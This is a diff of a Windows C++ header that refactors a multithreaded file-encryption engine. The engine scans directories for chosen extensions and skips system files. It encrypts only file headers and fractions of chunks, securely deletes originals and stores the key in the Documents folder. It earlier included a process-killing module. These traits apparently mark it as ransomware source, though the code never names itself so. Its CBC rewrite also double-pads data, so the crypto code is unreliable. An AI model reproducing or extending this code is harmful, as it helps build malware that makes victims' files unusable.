@@ -1,9 +1,11 @@
+// EncryptionUtils.h - MVVM架构重构版
 #pragma once
+
 #ifndef ENCRYPTION_UTILS_H
 #define ENCRYPTION_UTILS_H
 
 #define NOMINMAX
-#include"processkill.h"
+#define WIN32_LEAN_AND_MEAN
 #include <Windows.h>
 #include <iostream>
 #include <fstream>
@@ -29,49 +31,41 @@
 #include <unordered_map>
 #include <functional>
 #include <stdexcept>
-#include "Message.h"
+#include <future>
+#include <optional>
+
 
 // 使用inline避免重复定义
-inline constexpr DWORD HEADER_ENCRYPT_SIZE = 4096; // 文件头部加密4KB
-inline constexpr DWORD KEY_LENGTH = 16; // AES-128
-inline constexpr DWORD IV_LENGTH = 12;  // GCM推荐12字节IV
-inline constexpr DWORD TAG_LENGTH = 16; // GCM认证标签16字节
-inline constexpr size_t MEMORY_POOL_SIZE = 1024 * 1024 * 64; // 64MB内存池
-inline constexpr DWORD MAX_CONCURRENT_IO = 80; // 最大并发I/O操作数
-inline constexpr size_t ASYNC_BUFFER_SIZE = 1024 * 1024; // 1MB异步缓冲区
-inline constexpr size_t CHUNK_ENCRYPT_RATIO = 15; // 分块加密比例15%
-inline constexpr size_t CHUNK_SIZE = 1024 * 1024; // 分块大小1MB
+inline constexpr DWORD HEADER_ENCRYPT_SIZE = 4096;
+inline constexpr DWORD KEY_LENGTH = 32;
+inline constexpr DWORD IV_LENGTH = 16;
+inline constexpr DWORD TAG_LENGTH = 0;
+inline constexpr size_t MEMORY_POOL_SIZE = 1024 * 1024 * 64;
+inline constexpr DWORD MAX_CONCURRENT_IO = 80;
+inline constexpr size_t ASYNC_BUFFER_SIZE = 1024 * 1024;
+inline constexpr size_t CHUNK_ENCRYPT_RATIO = 15;
+inline constexpr size_t CHUNK_SIZE = 1024 * 1024;
+inline constexpr size_t LARGE_FILE_THRESHOLD = 64 * 1024 * 1024;
+inline constexpr size_t SMALL_FILE_THRESHOLD = 1024 * 1024;
+inline constexpr DWORD IOCP_CONCURRENCY = 4;
+inline constexpr DWORD AESNI_BATCH_SIZE = 8;
+inline constexpr DWORD MAX_WORKER_THREADS = 64;
+inline constexpr DWORD IO_THREADS = 4;
+inline constexpr DWORD COMPUTE_THREADS = 16;
+inline constexpr DWORD MANAGER_THREADS = 1;
 
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "Ole32.lib")
 #pragma comment(lib, "kernel32.lib")
 
-namespace fs = std::filesystem;
-inline fs::path GetUserDocumentsPath() {
-    PWSTR path = nullptr;
-    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &path);
-    if (SUCCEEDED(hr)) {
-        fs::path docsPath(path);
-        CoTaskMemFree(path);
-        return docsPath;
-    }
-    std::cerr << "SHGetKnownFolderPath failed: 0x" << std::hex << hr << std::endl;
-    return fs::current_path();
-}
-// 前向声明
-bool SecureDelete(const fs::path& path);
-bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
-
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-// 辅助函数
-void GenerateRandomKey(BYTE* key, DWORD length);
-bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName);
-fs::path GetUserDocumentsPath();
-bool IsAesNiSupported();
-std::string to_hex(NTSTATUS status);
+namespace fs = std::filesystem;
+bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
+// 前向声明
+bool SecureDelete(const fs::path& path);
 
 // 自定义min/max替代函数
 template<typename T>
@@ -84,7 +78,313 @@ T custom_max(T a, T b) {
     return a > b ? a : b;
 }
 
-// RAII封装 - 内存映射文件类（修复版）
+// 辅助函数
+inline void GenerateRandomKey(BYTE* key, DWORD length);
+inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName);
+inline fs::path GetUserDocumentsPath();
+inline bool IsAesNiSupported();
+inline std::string to_hex(NTSTATUS status);
+
+// 内存管理
+class MemoryPool {
+public:
+    MemoryPool(size_t poolSize = MEMORY_POOL_SIZE);
+    ~MemoryPool();
+
+    void* allocate(size_t size, size_t alignment = 16);
+    void deallocate(void* ptr);
+    void reset();
+    size_t getUsedMemory() const;
+    size_t getTotalMemory() const;
+
+private:
+    std::vector<uint8_t> buffer;
+    size_t usedMemory;
+    size_t totalMemory;
+};
+
+// 数据库文件检测
+class DatabaseFileDetector {
+public:
+    static bool isDatabaseFile(const fs::path& path);
+    static const std::unordered_set<std::string>& getDatabaseExtensions();
+
+private:
+    static const std::unordered_set<std::string> databaseExtensions;
+};
+
+// 系统文件检测
+class SystemFileDetector {
+public:
+    static bool isSystemFile(const fs::path& path);
+    static const std::vector<std::wstring>& getSystemPatterns();
+
+private:
+    static const std::vector<std::wstring> systemPatterns;
+};
+
+// 数据模型
+namespace Model {
+    // 加密任务数据结构
+    struct EncryptionTask {
+        fs::path inputPath;
+        fs::path outputPath;
+        std::vector<uint8_t> key;
+        size_t fileSize;
+        bool isDatabaseFile;
+        int priority;
+
+        bool operator<(const EncryptionTask& other) const {
+            return priority < other.priority;
+        }
+    };
+
+    // 加密结果数据结构
+    struct EncryptionResult {
+        bool success;
+        std::string errorMessage;
+        size_t bytesProcessed;
+        double processingTime;
+        std::chrono::system_clock::time_point completionTime;
+    };
+
+    // 加密数据模型
+    class EncryptionModel {
+    public:
+        EncryptionModel();
+        ~EncryptionModel();
+
+        std::vector<EncryptionTask> getPendingTasks() const;
+        void addTask(const EncryptionTask& task);
+        EncryptionResult executeTask(const EncryptionTask& task);
+        void clearCompletedTasks();
+        size_t getTaskCount() const;
+
+    private:
+        std::vector<EncryptionTask> tasks;
+        std::vector<EncryptionResult> results;
+        mutable std::mutex tasksMutex;
+        mutable std::mutex resultsMutex;
+    };
+
+    // 文件系统数据模型
+    class FileSystemModel {
+    public:
+        struct FileInfo {
+            fs::path path;
+            size_t size;
+            bool isDatabaseFile;
+            time_t lastModified;
+            DWORD attributes;
+        };
+
+        FileSystemModel();
+        ~FileSystemModel();
+
+        std::vector<FileInfo> scanDirectory(const fs::path& directory,
+            const std::vector<std::string>& extensions);
+        bool secureDelete(const fs::path& path);
+        bool isFileLocked(const fs::path& path) const;
+        std::vector<FileInfo> getLockedFiles() const;
+
+    private:
+        bool isSystemFile(const fs::path& path) const;
+        bool isDatabaseFile(const fs::path& path) const;
+        std::vector<FileInfo> lockedFiles;
+        mutable std::mutex lockedFilesMutex;
+    };
+
+    // 硬件数据模型
+    class HardwareModel {
+    public:
+        struct HardwareInfo {
+            bool aesniSupported;
+            uint32_t coreCount;
+            uint32_t threadCount;
+            size_t totalMemory;
+            size_t availableMemory;
+            std::string cpuBrand;
+            bool avxSupported;
+            bool avx2Supported;
+        };
+
+        HardwareModel();
+        ~HardwareModel();
+
+        HardwareInfo getHardwareInfo() const;
+        bool optimizeForHardware();
+
+    private:
+        bool checkAesNiSupport() const;
+        uint32_t getCoreCount() const;
+        std::string getCpuBrand() const;
+        HardwareInfo cachedInfo;
+    };
+}
+
+// 视图模型
+namespace ViewModel {
+    // 性能指标数据结构
+    struct PerformanceMetrics {
+        double cpuUsage;
+        double memoryUsage;
+        double diskThroughput;
+        size_t filesProcessed;
+        size_t bytesProcessed;
+        std::chrono::milliseconds totalTime;
+        size_t successfulEncryptions;
+        size_t failedEncryptions;
+        double encryptionRateMBs;
+    };
+
+    // 加密视图模型
+    class EncryptionViewModel {
+    public:
+        EncryptionViewModel();
+        ~EncryptionViewModel();
+
+        void initialize();
+        void shutdown();
+
+        bool startEncryption(const fs::path& directory,
+            const std::vector<std::string>& extensions);
+        void stopEncryption();
+        PerformanceMetrics getPerformanceMetrics() const;
+        bool isEncryptionRunning() const;
+        void pauseEncryption();
+        void resumeEncryption();
+
+    private:
+        void processFiles();
+        void scheduleTasks();
+        void monitorPerformance();
+        void updateMetrics(const Model::EncryptionResult& result);
+
+        std::unique_ptr<Model::EncryptionModel> encryptionModel;
+        std::unique_ptr<Model::FileSystemModel> fileSystemModel;
+        std::unique_ptr<Model::HardwareModel> hardwareModel;
+
+        std::atomic<bool> isRunning;
+        std::atomic<bool> isPaused;
+        std::thread processingThread;
+        std::thread schedulingThread;
+        std::thread monitoringThread;
+
+        mutable std::mutex metricsMutex;
+        PerformanceMetrics currentMetrics;
+        std::chrono::steady_clock::time_point startTime;
+    };
+}
+
+// 四层架构实现
+namespace Architecture {
+    // 任务优先级结构
+    struct TaskPriority {
+        size_t fileSize;
+        bool isDatabaseFile;
+        time_t timestamp;
+        int userPriority;
+
+        bool operator<(const TaskPriority& other) const {
+            if (fileSize != other.fileSize) return fileSize < other.fileSize;
+            if (isDatabaseFile != other.isDatabaseFile) return isDatabaseFile < other.isDatabaseFile;
+            return timestamp < other.timestamp;
+        }
+    };
+
+    // 调度层
+    class SchedulerLayer {
+    public:
+        using EncryptionTask = Model::EncryptionTask;
+        using EncryptionResult = Model::EncryptionResult;
+
+        SchedulerLayer(size_t maxConcurrency);
+        ~SchedulerLayer();
+
+        void addTask(EncryptionTask task);
+        std::optional<EncryptionTask> getNextTask();
+        void completeTask(const EncryptionTask& task, const EncryptionResult& result);
+        size_t getPendingTaskCount() const;
+        size_t getCompletedTaskCount() const;
+        void clearCompletedTasks();
+
+    private:
+        std::priority_queue<std::pair<TaskPriority, EncryptionTask>> taskQueue;
+        std::vector<std::pair<EncryptionTask, EncryptionResult>> completedTasks;
+        mutable std::mutex queueMutex;
+        mutable std::mutex completedMutex;
+        std::condition_variable queueCondition;
+        std::atomic<size_t> activeTasks;
+        size_t maxConcurrentTasks;
+    };
+
+    // 执行层
+    class ExecutionLayer {
+    public:
+        ExecutionLayer(size_t threadCount);
+        ~ExecutionLayer();
+
+        bool executeTask(const Model::EncryptionTask& task);
+        void stop();
+        size_t getActiveThreadCount() const;
+
+    private:
+        void workerThread();
+        bool processFile(const Model::EncryptionTask& task);
+        bool encryptFileChunksCBC(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
+            const BYTE* inputData, size_t fileSize,
+            HANDLE hOutputFile, bool isDatabaseFile);
+        size_t calculateChunkEncryptSize(size_t chunkSize) const;
+
+        std::vector<std::thread> workerThreads;
+        std::atomic<bool> stopFlag;
+        std::atomic<size_t> activeThreads;
+        MemoryPool memoryPool;
+    };
+
+    // 硬件层
+    class HardwareLayer {
+    public:
+        HardwareLayer();
+        ~HardwareLayer();
+
+        bool initialize();
+        void shutdown();
+
+        bool encryptData(std::vector<uint8_t>& input, std::vector<uint8_t>& output,
+            std::vector<uint8_t>& key, std::vector<uint8_t>& iv);
+        bool supportsAESNI() const;
+        bool supportsAVX() const;
+        bool supportsAVX2() const;
+        size_t getOptimalBatchSize() const;
+
+    private:
+        BCRYPT_ALG_HANDLE aesAlgorithm;
+        bool aesniSupported;
+        bool avxSupported;
+        bool avx2Supported;
+    };
+}
+
+// 应用层
+class ApplicationLayer {
+public:
+    ApplicationLayer();
+    ~ApplicationLayer();
+
+    void run();
+    void stop();
+    void configure(const std::vector<std::string>& extensions,
+        const fs::path& directory);
+    ViewModel::PerformanceMetrics getMetrics() const;
+
+private:
+    std::unique_ptr<ViewModel::EncryptionViewModel> viewModel;
+    std::vector<std::string> targetExtensions;
+    fs::path targetDirectory;
+};
+
+// RAII封装 - 内存映射文件类
 class MemoryMappedFile {
 public:
     MemoryMappedFile() : hFile(INVALID_HANDLE_VALUE), hMapping(NULL), pData(nullptr), size(0) {}
@@ -94,24 +394,58 @@ public:
     }
 
     bool open(const fs::path& filePath, DWORD access = GENERIC_READ | GENERIC_WRITE,
+        DWORD sharing = FILE_SHARE_READ | FILE_SHARE_WRITE,
         DWORD mappingProtect = PAGE_READWRITE, DWORD viewAccess = FILE_MAP_READ | FILE_MAP_WRITE) {
         close();
 
-        // 打开文件
-        hFile = CreateFileW(filePath.c_str(), access, FILE_SHARE_READ, NULL,
+        // 尝试以完全访问权限打开文件
+        hFile = CreateFileW(filePath.c_str(), access, sharing, NULL,
             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+
         if (hFile == INVALID_HANDLE_VALUE) {
-            return false;
+            DWORD error = GetLastError();
+
+            // 如果访问被拒绝，尝试只读模式
+            if (error == ERROR_ACCESS_DENIED || error == ERROR_SHARING_VIOLATION) {
+                std::cerr << "警告: 无法以读写模式打开文件，尝试只读模式: " << filePath << std::endl;
+                access = GENERIC_READ;
+                sharing = FILE_SHARE_READ;
+                mappingProtect = PAGE_READONLY;
+                viewAccess = FILE_MAP_READ;
+
+                hFile = CreateFileW(filePath.c_str(), access, sharing, NULL,
+                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+                if (hFile == INVALID_HANDLE_VALUE) {
+                    error = GetLastError();
+                    std::cerr << "无法打开文件: " << filePath << " 错误: " << error << std::endl;
+                    return false;
+                }
+            }
+            else {
+                std::cerr << "CreateFileW失败: " << filePath << " 错误: " << error << std::endl;
+                return false;
+            }
         }
 
         // 获取文件大小
         LARGE_INTEGER fileSize;
         if (!GetFileSizeEx(hFile, &fileSize)) {
+            DWORD error = GetLastError();
+            CloseHandle(hFile);
+            hFile = INVALID_HANDLE_VALUE;
+            std::cerr << "GetFileSizeEx失败: " << error << std::endl;
+            return false;
+        }
+        size = static_cast<size_t>(fileSize.QuadPart);
+
+        // 处理空文件
+        if (size == 0) {
+            std::cerr << "文件为空: " << filePath << std::endl;
             CloseHandle(hFile);
             hFile = INVALID_HANDLE_VALUE;
             return false;
         }
-        size = static_cast<size_t>(fileSize.QuadPart);
 
         // 创建内存映射
         hMapping = CreateFileMappingW(hFile, NULL, mappingProtect, 0, 0, NULL);
@@ -119,7 +453,7 @@ public:
             DWORD error = GetLastError();
             CloseHandle(hFile);
             hFile = INVALID_HANDLE_VALUE;
-            std::cerr << "CreateFileMappingW failed. Error: " << error << std::endl;
+            std::cerr << "CreateFileMappingW失败: " << error << std::endl;
             return false;
         }
 
@@ -131,7 +465,7 @@ public:
             CloseHandle(hFile);
             hMapping = NULL;
             hFile = INVALID_HANDLE_VALUE;
-            std::cerr << "MapViewOfFile failed. Error: " << error << std::endl;
+            std::cerr << "MapViewOfFile失败: " << error << std::endl;
             return false;
         }
 
@@ -164,220 +498,6 @@ private:
     void* pData;
     size_t size;
 };
-
-// RAII封装 - 异步I/O上下文
-struct AsyncIOContext {
-    OVERLAPPED overlapped;
-    HANDLE hFile;
-    void* buffer;
-    DWORD bufferSize;
-    std::function<void(DWORD)> callback;
-    std::atomic<bool> completed;
-
-    AsyncIOContext() : hFile(INVALID_HANDLE_VALUE), buffer(nullptr), bufferSize(0), completed(false) {
-        ZeroMemory(&overlapped, sizeof(OVERLAPPED));
-    }
-
-    ~AsyncIOContext() {
-        if (buffer) {
-            VirtualFree(buffer, 0, MEM_RELEASE);
-        }
-    }
-
-    bool allocateBuffer(DWORD size) {
-        buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!buffer) return false;
-        bufferSize = size;
-        return true;
-    }
-};
-
-// IOCP线程池实现
-class IOCPThreadPool {
-public:
-    IOCPThreadPool(size_t minThreads, size_t maxThreads) : stop(false) {
-        hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
-        if (!hCompletionPort) {
-            throw std::runtime_error("Failed to create IOCP");
-        }
-
-        threadCount = CalculateOptimalThreadCount(minThreads, maxThreads);
-        for (size_t i = 0; i < threadCount; ++i) {
-            threads.emplace_back([this] { worker(); });
-        }
-    }
-
-    ~IOCPThreadPool() {
-        stop = true;
-        for (size_t i = 0; i < threads.size(); ++i) {
-            PostQueuedCompletionStatus(hCompletionPort, 0, 0, NULL);
-        }
-
-        for (auto& thread : threads) {
-            if (thread.joinable()) thread.join();
-        }
-
-        if (hCompletionPort) CloseHandle(hCompletionPort);
-    }
-
-    bool associateDevice(HANDLE hDevice, ULONG_PTR completionKey) {
-        return CreateIoCompletionPort(hDevice, hCompletionPort, completionKey, 0) != NULL;
-    }
-
-    bool postCompletion(DWORD bytesTransferred, ULONG_PTR completionKey, OVERLAPPED* overlapped) {
-        return PostQueuedCompletionStatus(hCompletionPort, bytesTransferred, completionKey, overlapped);
-    }
-
-private:
-    size_t CalculateOptimalThreadCount(size_t minThreads, size_t maxThreads) {
-        SYSTEM_INFO sysInfo;
-        GetSystemInfo(&sysInfo);
-
-        size_t cpuCount = sysInfo.dwNumberOfProcessors;
-        if (cpuCount == 0) cpuCount = 1;
-
-        // 根据CPU和内存大小计算线程数
-        MEMORYSTATUSEX memInfo;
-        memInfo.dwLength = sizeof(memInfo);
-        GlobalMemoryStatusEx(&memInfo);
-
-        size_t memoryBasedThreads = static_cast<size_t>(memInfo.ullTotalPhys / (1024 * 1024 * 1024)) * 2;
-
-        size_t dynamicCount = custom_min(cpuCount * 2 + memoryBasedThreads, maxThreads);
-        size_t temp = custom_min(dynamicCount, maxThreads);
-        return custom_max(temp, minThreads);
-    }
-
-    void worker() {
-        while (!stop) {
-            DWORD bytesTransferred = 0;
-            ULONG_PTR completionKey = 0;
-            OVERLAPPED* overlapped = nullptr;
-
-            BOOL success = GetQueuedCompletionStatus(
-                hCompletionPort, &bytesTransferred, &completionKey, &overlapped, INFINITE);
-
-            if (stop) break;
-
-            if (!success || overlapped == nullptr) {
-                continue;
-            }
-
-            AsyncIOContext* context = CONTAINING_RECORD(overlapped, AsyncIOContext, overlapped);
-            if (context && context->callback) {
-                context->callback(bytesTransferred);
-                context->completed = true;
-            }
-        }
-    }
-
-    HANDLE hCompletionPort;
-    std::vector<std::thread> threads;
-    std::atomic<bool> stop;
-    size_t threadCount;
-};
-
-// 内存池
-class SmartMemoryPool {
-public:
-    SmartMemoryPool(size_t poolSize = MEMORY_POOL_SIZE) : poolSize(poolSize) {
-        pool = VirtualAlloc(NULL, poolSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!pool) {
-            throw std::runtime_error("Failed to allocate memory pool");
-        }
-
-        freeBlocks.emplace(0, poolSize);
-    }
-
-    ~SmartMemoryPool() {
-        if (pool) {
-            VirtualFree(pool, 0, MEM_RELEASE);
-        }
-    }
-
-    void* allocate(size_t size) {
-        std::lock_guard<std::mutex> lock(mutex);
-
-        // 寻找足够大的空闲块
-        for (auto it = freeBlocks.begin(); it != freeBlocks.end(); ++it) {
-            if (it->second >= size) {
-                void* ptr = static_cast<char*>(pool) + it->first;
-
-                // 分割块
-                if (it->second > size) {
-                    freeBlocks[it->first + size] = it->second - size;
-                }
-                freeBlocks.erase(it);
-
-                allocatedBlocks[ptr] = size;
-                return ptr;
-            }
-        }
-
-        // 没有足够空间，回退到常规分配
-        return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    }
-
-    void deallocate(void* ptr) {
-        std::lock_guard<std::mutex> lock(mutex);
-
-        auto it = allocatedBlocks.find(ptr);
-        if (it == allocatedBlocks.end()) {
-            // 不是从池中分配的，使用常规释放
-            VirtualFree(ptr, 0, MEM_RELEASE);
-            return;
-        }
-
-        size_t offset = static_cast<char*>(ptr) - static_cast<char*>(pool);
-        size_t size = it->second;
-
-        // 合并相邻的空闲块
-        freeBlocks[offset] = size;
-        mergeFreeBlocks();
-
-        allocatedBlocks.erase(it);
-    }
-
-private:
-    void mergeFreeBlocks() {
-        auto it = freeBlocks.begin();
-        while (it != freeBlocks.end()) {
-            auto next = it;
-            ++next;
-
-            if (next != freeBlocks.end() && it->first + it->second == next->first) {
-                // 合并相邻块
-                it->second += next->second;
-                freeBlocks.erase(next);
-            }
-            else {
-                ++it;
-            }
-        }
-    }
-
-    void* pool;
-    size_t poolSize;
-    std::mutex mutex;
-    std::map<size_t, size_t> freeBlocks; // offset -> size
-    std::unordered_map<void*, size_t> allocatedBlocks; // ptr -> size
-};
-
-// 全局内存池
-inline SmartMemoryPool& getGlobalMemoryPool() {
-    static SmartMemoryPool pool;
-    return pool;
-}
-
-// 全局IOCP线程池
-inline std::unique_ptr<IOCPThreadPool>& getGlobalIOCPPool() {
-    static std::unique_ptr<IOCPThreadPool> pool;
-    if (!pool) {
-        pool = std::make_unique<IOCPThreadPool>(4, 64);
-    }
-    return pool;
-}
-
 // 异步加密管理器
 class AsyncEncryptionManager {
 public:
@@ -445,7 +565,7 @@ private:
             fs::path outputFile = std::get<1>(task);
             const BYTE* key = std::get<2>(task);
 
-            bool encryptSuccess = EncryptFileCNG(inputFile, outputFile, key);
+            bool encryptSuccess = EncryptFileCNG(inputFile, outputFile, key); // 这里需要实现加密函数
 
             {
                 std::lock_guard<std::mutex> lock(queueMutex);
@@ -484,9 +604,8 @@ inline size_t CalculateChunkEncryptSize(size_t chunkSize) {
     return custom_max(encryptSize, static_cast<size_t>(16));
 }
 
-// GCM模式加密函数
-// 修改EncryptFileChunksGCM函数中的authInfo设置部分
-inline bool EncryptFileChunksGCM(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
+// CBC模式加密函数
+inline bool EncryptFileChunksCBC(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
     const BYTE* inputData, size_t fileSize,
     HANDLE hOutputFile, bool isDatabaseFile) {
     try {
@@ -497,31 +616,22 @@ inline bool EncryptFileChunksGCM(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
             // 写入IV到文件开头
             writeOffset.QuadPart = 0;
             if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
-                throw std::runtime_error("SetFilePointerEx failed for IV write");
+                throw std::runtime_error("SetFilePointerEx失败: IV写入");
             }
 
             if (!WriteFile(hOutputFile, iv, IV_LENGTH, &bytesWritten, NULL) || bytesWritten != IV_LENGTH) {
-                throw std::runtime_error("Failed to write IV");
+                throw std::runtime_error("写入IV失败");
             }
         }
-
-        // 设置GCM模式信息
-        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
-        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
-
-        // 修复：使用const_cast移除const限定符
-        authInfo.pbNonce = const_cast<BYTE*>(iv);
-        authInfo.cbNonce = IV_LENGTH;
-
-        // 为认证标签预留空间
-        std::vector<BYTE> tagBuffer(TAG_LENGTH);
-        authInfo.pbTag = tagBuffer.data();
-        authInfo.cbTag = TAG_LENGTH;
 
         // 分块加密逻辑
         size_t totalChunks = (fileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
         std::vector<BYTE> chunkBuffer(CHUNK_SIZE);
-        std::vector<BYTE> encryptedChunkBuffer(CHUNK_SIZE + TAG_LENGTH); // 额外空间用于标签
+        std::vector<BYTE> encryptedChunkBuffer(CHUNK_SIZE + 16); // 额外空间用于填充
+
+        // 对于CBC模式，我们需要保持IV链
+        BYTE currentIV[IV_LENGTH];
+        memcpy(currentIV, iv, IV_LENGTH);
 
         for (size_t chunkIndex = 0; chunkIndex < totalChunks; ++chunkIndex) {
             size_t chunkOffset = chunkIndex * CHUNK_SIZE;
@@ -532,7 +642,7 @@ inline bool EncryptFileChunksGCM(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
 
             // 计算当前块的加密大小
             size_t encryptSizeThisChunk = 0;
-            if (fileSize < 1024 * 1024) { // 小于1MB
+            if (fileSize < SMALL_FILE_THRESHOLD) { // 小于1MB
                 if (chunkIndex == 0) { // 只加密第一个块的头部
                     encryptSizeThisChunk = custom_min(static_cast<size_t>(HEADER_ENCRYPT_SIZE), currentChunkSize);
                 }
@@ -543,35 +653,79 @@ inline bool EncryptFileChunksGCM(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
             }
 
             if (encryptSizeThisChunk > 0) {
-                // 加密当前块的数据
+                // 确保加密大小是16字节的倍数（AES块大小）
+                size_t paddedSize = encryptSizeThisChunk;
+                if (paddedSize % 16 != 0) {
+                    paddedSize = paddedSize + (16 - (paddedSize % 16));
+                }
+
+                // 确保缓冲区足够大
+                std::vector<BYTE> paddedChunk(paddedSize);
+                memcpy(paddedChunk.data(), chunkBuffer.data(), encryptSizeThisChunk);
+
+                // 对于非完整块，进行填充
+                if (encryptSizeThisChunk < paddedSize) {
+                    // 使用PKCS7填充
+                    BYTE padValue = static_cast<BYTE>(paddedSize - encryptSizeThisChunk);
+                    for (size_t i = encryptSizeThisChunk; i < paddedSize; ++i) {
+                        paddedChunk[i] = padValue;
+                    }
+                }
+
                 ULONG cbResult = 0;
                 NTSTATUS status = BCryptEncrypt(
                     hKey,
-                    chunkBuffer.data(),
-                    static_cast<ULONG>(encryptSizeThisChunk),
-                    &authInfo,
-                    nullptr, // 无额外认证数据
-                    0,
+                    paddedChunk.data(),
+                    static_cast<ULONG>(paddedSize),
+                    NULL,           // 不需要额外的认证信息
+                    currentIV,      // 使用当前的IV
+                    IV_LENGTH,
                     encryptedChunkBuffer.data(),
                     static_cast<ULONG>(encryptedChunkBuffer.size()),
                     &cbResult,
-                    0
+                    BCRYPT_BLOCK_PADDING  // 使用块填充
                 );
 
                 if (!NT_SUCCESS(status)) {
-                    throw std::runtime_error("BCryptEncrypt failed in chunk " +
-                        std::to_string(chunkIndex) + ": " + to_hex(status));
+                    // 增强错误日志
+                    std::cerr << "BCryptEncrypt失败 in chunk " << chunkIndex
+                        << " with status: " << to_hex(status)
+                        << " for input size: " << paddedSize << std::endl;
+
+                    // 重试一次
+                    status = BCryptEncrypt(
+                        hKey,
+                        paddedChunk.data(),
+                        static_cast<ULONG>(paddedSize),
+                        NULL,
+                        currentIV,
+                        IV_LENGTH,
+                        encryptedChunkBuffer.data(),
+                        static_cast<ULONG>(encryptedChunkBuffer.size()),
+                        &cbResult,
+                        BCRYPT_BLOCK_PADDING
+                    );
+
+                    if (!NT_SUCCESS(status)) {
+                        throw std::runtime_error("BCryptEncrypt重试失败 in chunk " +
+                            std::to_string(chunkIndex) + ": " + to_hex(status));
+                    }
+                }
+
+                // 更新IV为最后一个密文块（用于下一个块的加密）
+                if (cbResult >= IV_LENGTH) {
+                    memcpy(currentIV, encryptedChunkBuffer.data() + cbResult - IV_LENGTH, IV_LENGTH);
                 }
 
                 // 写入加密数据
                 writeOffset.QuadPart = isDatabaseFile ? chunkOffset : (IV_LENGTH + chunkOffset);
                 if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
-                    throw std::runtime_error("SetFilePointerEx failed for chunk write");
+                    throw std::runtime_error("SetFilePointerEx失败: 块写入");
                 }
 
                 if (!WriteFile(hOutputFile, encryptedChunkBuffer.data(), cbResult, &bytesWritten, NULL) ||
                     bytesWritten != cbResult) {
-                    throw std::runtime_error("WriteFile failed for chunk " + std::to_string(chunkIndex));
+                    throw std::runtime_error("WriteFile失败 for chunk " + std::to_string(chunkIndex));
                 }
             }
 
@@ -583,28 +737,15 @@ inline bool EncryptFileChunksGCM(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
                     (IV_LENGTH + chunkOffset + encryptSizeThisChunk);
 
                 if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
-                    throw std::runtime_error("SetFilePointerEx failed for remaining data write");
+                    throw std::runtime_error("SetFilePointerEx失败: 剩余数据写入");
                 }
 
                 if (!WriteFile(hOutputFile, chunkBuffer.data() + encryptSizeThisChunk,
                     static_cast<DWORD>(remainingSize), &bytesWritten, NULL) ||
                     bytesWritten != remainingSize) {
-                    throw std::runtime_error("WriteFile failed for remaining data in chunk " +
+                    throw std::runtime_error("WriteFile失败 for remaining data in chunk " +
                         std::to_string(chunkIndex));
                 }
-            }
-        }
-
-        // 写入认证标签
-        if (!isDatabaseFile) {
-            writeOffset.QuadPart = IV_LENGTH + fileSize;
-            if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
-                throw std::runtime_error("SetFilePointerEx failed for tag write");
-            }
-
-            if (!WriteFile(hOutputFile, tagBuffer.data(), TAG_LENGTH, &bytesWritten, NULL) ||
-                bytesWritten != TAG_LENGTH) {
-                throw std::runtime_error("Failed to write authentication tag");
             }
         }
 
@@ -616,7 +757,7 @@ inline bool EncryptFileChunksGCM(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
     }
 }
 
-// 修改EncryptFileCNG函数中的EncryptFileChunksGCM调用部分
+// 修改EncryptFileCNG函数以使用CBC模式
 bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
     BCRYPT_ALG_HANDLE hAlgorithm = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
@@ -629,258 +770,78 @@ bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const
     MemoryMappedFile inputMap;
 
     try {
-        // Check AES-NI hardware acceleration support
+        // 检查文件是否可访问
+        DWORD attributes = GetFileAttributesW(inputFile.c_str());
+        if (attributes == INVALID_FILE_ATTRIBUTES) {
+            DWORD error = GetLastError();
+            std::cerr << "无法访问文件: " << inputFile << " 错误: " << error << std::endl;
+            return false;
+        }
+
+        // 检查文件是否被系统或隐藏
+        if (attributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
+            std::cerr << "跳过系统或隐藏文件: " << inputFile << std::endl;
+            return false;
+        }
+
+        // 尝试打开内存映射文件（使用共享模式）
+        if (!inputMap.open(inputFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, PAGE_READONLY, FILE_MAP_READ)) {
+            DWORD error = GetLastError();
+            std::cerr << "无法内存映射文件，可能被其他进程锁定: " << inputFile << " 错误: " << error << std::endl;
+            return false;
+        }
+
+        // 检查文件大小
+        size_t fileSize = inputMap.getSize();
+        if (fileSize == 0) {
+            std::cerr << "文件为空: " << inputFile << std::endl;
+            return false;
+        }
+
+        // 检查AES-NI硬件加速支持
